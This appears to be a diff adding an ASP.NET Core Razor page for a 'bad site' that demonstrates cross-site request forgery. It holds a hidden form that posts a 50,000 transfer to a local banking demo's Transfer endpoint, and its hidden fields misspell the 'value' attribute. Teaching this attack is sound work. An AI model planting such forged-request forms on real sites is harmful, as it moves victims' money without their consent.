@@ -1,0 +1,19 @@
+﻿@page
+@model IndexModel
+@{
+    ViewData["Title"] = "坏站点";
+}
+
+<div class="text-center">
+    <h1 class="display-4">Welcome</h1>
+    <p>Learn about <a href="https://docs.microsoft.com/aspnet/core">building Web apps with ASP.NET Core</a>.</p>
+    
+    <div>
+        <p>隐藏式表单执行转账</p>
+        <form action="https://localhost:7167/Account/Transfer" method="post">
+            <label>账号：<input type="hidden" name="name" vale="坏人" /></label>
+            <label>金额：<input type="hidden" name="amount" vale="50000" /></label>
+            <input type="submit" value="提交" />
+        </form>
+    </div>
+</div>
